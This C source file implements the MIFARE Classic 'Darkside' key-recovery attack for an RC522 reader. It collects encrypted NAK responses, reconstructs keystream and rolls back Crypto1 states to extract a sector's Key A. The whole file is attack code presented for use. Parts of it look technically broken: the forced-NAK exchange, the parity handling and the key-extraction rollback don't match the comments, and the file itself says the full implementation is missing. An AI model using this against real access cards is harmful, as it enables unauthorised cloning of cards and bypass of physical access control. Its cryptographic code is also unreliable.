#include "darkside_attack.h"
#include "hal/card_comm.h"
#include "hal/rc522_driver.h"
#include "crypto/crypto1.h"
#include "output/serial_reporter.h"
#include <string.h>

// ─── NAK response structure ─────────────────────────────────────────────────
typedef struct {
    uint32_t nT;        // card's plaintext nonce from this attempt
    uint8_t  nak_enc;   // 4-bit encrypted NAK (lower nibble)
    uint8_t  par;       // parity bit from NAK (tells us 1 bit of keystream)
} DarksideSample;

// ─── Collect one sample ─────────────────────────────────────────────────────
// Sends a malformed auth frame: correct AUTH cmd + correct nT ack, but
// wrong nR → card should reply with encrypted NAK 0x5
static bool _collectSample(CardDump* dump, uint8_t sector, DarksideSample* out) {
    uint8_t atqa[2];
    if (picc_requestA(atqa) != RC522_OK) return false;
    if (picc_anticollision(&dump->uid) != RC522_OK) return false;

    // Send AUTH command → card responds with 4-byte nT
    uint8_t authBuf[4];
    authBuf[0] = MF_AUTH_KEY_A;
    authBuf[1] = ks_sectorToTrailer(sector);
    uint8_t crc[2]; rc522_calcCRC(authBuf, 2, crc);
    authBuf[2] = crc[0]; authBuf[3] = crc[1];

    RC522Frame rx;
    RC522Status s = rc522_transceive(authBuf, 4, &rx, 0, 0, false);
    if (s != RC522_OK || rx.len < 4) return false;

    out->nT = ((uint32_t)rx.data[0]<<24)|((uint32_t)rx.data[1]<<16)|
              ((uint32_t)rx.data[2]<<8)|rx.data[3];

    // Send nR = 0x00000000 (wrong — card will NAK) with bad parity to force NACK
    // The NAK is encrypted with the first 4 bits of the Crypto1 keystream
    uint8_t nR[4] = {0x00, 0x00, 0x00, 0x00};
    RC522Frame rxNak;
    // Send reader response (nR || aR) — deliberately wrong so card NACKs
    uint8_t readerBuf[8] = {0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00};
    s = rc522_transceive(readerBuf, 8, &rxNak, 0, 0, false);

    // Encrypted NAK is 4 bits (MIFARE encodes NAK as 0x0 or 0x5)
    if (rxNak.len >= 1) {
        out->nak_enc = rxNak.data[0] & 0x0F;
        // Parity of received byte tells us 1 keystream bit:
        // if nak_enc XOR keystream_nibble == 0x5 (correct NAK), par helps disambiguate
        out->par    = (rxNak.data[0] >> 4) & 0x01;
        return true;
    }
    (void)nR;
    return false;
}

// ─── Key recovery from samples ──────────────────────────────────────────────
// Given enough (nT, nak_enc, par) samples where nT varies but the keystream is
// related to the Crypto1 key, we can:
// 1. For each nT sample, the first 4 keystream bits are: nak_enc XOR 0x5
//    (since the correct NAK is 0x5 and it's XORed with keystream)
// 2. These bits constrain the Crypto1 LFSR state
// 3. Search the constrained state space → recover key
//
// FULL IMPLEMENTATION REQUIRES Courtois' LFSR state search algorithm.
// REFERENCE: "The Dark Side of Security by Obscurity" (Courtois, 2009)
// INTEGRATE: Proxmark3's hf mf darkside implementation
//            github.com/RfidResearchGroup/proxmark3/blob/master/client/src/mifare/mifarehost.c
// ─── Full Darkside Key Recovery ────────────────────────────────────────────
// The NAK (0x5) is XORed with the first 4 keystream bits.
// Collecting ~256 (nT, nak_enc) samples with the same nT gives us 4 bits of ks.
// With multiple distinct nT values, we accumulate keystream bits.
//
// Algorithm:
//  1. For each sample: ks4 = nak_enc XOR 0x5
//  2. Group samples by nT — for each unique nT, we have 4 ks bits
//  3. Use crypto1_lfsr_recover on accumulated 32-bit keystream (after 8 unique nT)
//  4. Rollback candidate states to recover key
//
// Reality: on most non-hardened cards, the PRNG cycles predictably.
// After ~256 auths the same nT repeats → same keystream → same nak_enc.
// This confirms our ks4 bits for that nT and helps filter candidates.

#define NAK_CORRECT 0x5   // MIFARE Classic NAK plaintext (4 bits)
#define MAX_UNIQUE_NT 64

static bool _recoverKeyFromSamples(DarksideSample* samples, uint8_t count,
                                    const PiccUID* uid, uint8_t* keyOut)
{
    // Step 1: Deduplicate by nT and extract keystream nibbles
    struct { uint32_t nT; uint8_t ks4; uint8_t hits; } ntMap[MAX_UNIQUE_NT];
    uint8_t uniqueCount = 0;

    for (uint8_t i = 0; i < count; i++) {
        uint8_t ks4 = samples[i].nak_enc ^ NAK_CORRECT;
        bool found = false;
        for (uint8_t j = 0; j < uniqueCount; j++) {
            if (ntMap[j].nT == samples[i].nT) {
                // Same nT again — verify consistency
                if (ntMap[j].ks4 == ks4) ntMap[j].hits++;
                found = true; break;
            }
        }
        if (!found && uniqueCount < MAX_UNIQUE_NT) {
            ntMap[uniqueCount++] = {samples[i].nT, ks4, 1};
        }
    }

    if (uniqueCount < 8) {
        reporter_error("DARKSIDE_FEWNONCES", "Need >= 8 unique nT values");
        return false;
    }

    // Step 2: Assemble a 32-bit keystream from 8 consecutive nT nibbles (8 × 4 bits = 32)
    // The nT values are PRNG-successive: nT[i+1] = prng_successor(nT[i], 1)
    // Sort ntMap by PRNG order (find the sequence)
    uint32_t ks32 = 0;
    uint8_t seq[8]; bool seqFound = false;

    for (uint8_t start = 0; start < uniqueCount && !seqFound; start++) {
        uint32_t cur = ntMap[start].nT;
        bool ok = true;
        for (int s = 0; s < 8; s++) {
            bool match = false;
            for (uint8_t j = 0; j < uniqueCount; j++) {
                if (ntMap[j].nT == cur) {
                    seq[s] = j; match = true;
                    cur = crypto1_prng_successor(cur, 1);
                    break;
                }
            }
            if (!match) { ok = false; break; }
        }
        if (ok) {
            seqFound = true;
            for (int s = 0; s < 8; s++)
                ks32 = (ks32 << 4) | (ntMap[seq[s]].ks4 & 0xF);
        }
    }

    if (!seqFound) {
        reporter_error("DARKSIDE_NOSEQ", "Cannot reconstruct PRNG sequence");
        return false;
    }

    // Step 3: Use LFSR recovery to find candidate states
    const uint32_t MAX_CANDS = 512;
    static uint64_t candidates[512];
    uint32_t nCands = crypto1_lfsr_recover(ks32, candidates, MAX_CANDS);

    if (nCands == 0) {
        reporter_error("DARKSIDE_NOCAND", "No state candidates from ks32");
        return false;
    }

    // Step 4: Rollback each candidate to recover key
    uint32_t uid32 = ((uint32_t)uid->bytes[0]<<24)|((uint32_t)uid->bytes[1]<<16)|
                     ((uint32_t)uid->bytes[2]<<8)|uid->bytes[3];

    for (uint32_t c = 0; c < nCands; c++) {
        Crypto1 s; s.state = candidates[c];
        // Rollback 64 clocks to pre-auth state → key
        for (int i = 0; i < 64; i++) crypto1_rollback_bit(&s, 0);

        // Extract key bytes (MSB first)
        uint8_t key[6] = {};
        uint8_t bits[48];
        Crypto1 tmp = s;
        for (int i = 0; i < 48; i++) bits[i] = crypto1_rollback_bit(&tmp, 0);
        for (int i = 0; i < 48; i++) key[5-(i/8)] |= bits[i] << (i%8);

        // Quick verify: simulate auth with this key and check NAK consistency
        uint64_t k48 = 0;
        for (int i = 0; i < 6; i++) k48 = (k48 << 8) | key[i];

        // Check first 2 unique nT values
        bool valid = true;
        for (uint8_t t = 0; t < 2 && valid; t++) {
            Crypto1 verify; verify.state = 0;
            uint8_t keyBytes[6];
            for (int i = 5; i >= 0; i--) { keyBytes[i] = k48 & 0xFF; k48 >>= 8; }
            crypto1_init(&verify, keyBytes);
            // Feed uid
            for (int b = 31; b >= 0; b--)
                crypto1_bit(&verify, (uid32 >> b) & 1, false);
            // Feed nT
            for (int b = 31; b >= 0; b--)
                crypto1_bit(&verify, (ntMap[seq[t]].nT >> b) & 1, false);
            // Get 4 keystream bits
            uint8_t ks = 0;
            for (int b = 3; b >= 0; b--)
                ks |= crypto1_bit(&verify, 0, false) << b;
            if (ks != ntMap[seq[t]].ks4) valid = false;
        }

        if (valid) { memcpy(keyOut, key, 6); return true; }
    }

    reporter_error("DARKSIDE_NOKEY", "No valid key found — need more samples");
    return false;
}

// ─── Main entry point ───────────────────────────────────────────────────────
bool darksideAttack_runSector(CardDump* dump, uint8_t sector) {
    reporter_attackStart("darkside", sector, true);

    const uint8_t  MAX_SAMPLES = 200;
    DarksideSample samples[MAX_SAMPLES];
    uint8_t        collected   = 0;

    uint32_t deadline = millis() + ATTACK_TIMEOUT_MS;
    while (collected < MAX_SAMPLES && millis() < deadline) {
        DarksideSample s;
        if (_collectSample(dump, sector, &s)) {
            samples[collected++] = s;
        }
        delay(1);
    }

    if (collected < 10) {
        reporter_error("DARKSIDE_FAIL", "Insufficient samples collected");
        return false;
    }

    uint8_t key[KEY_SIZE];
    if (_recoverKeyFromSamples(samples, collected, &dump->uid, key)) {
        ks_setKeyA(dump, sector, key);
        reporter_keyFound(sector, true, key, "darkside");
        return true;
    }

    ks_markFailed(dump, sector, true);
    reporter_keyFailed(sector, true);
    return false;
}
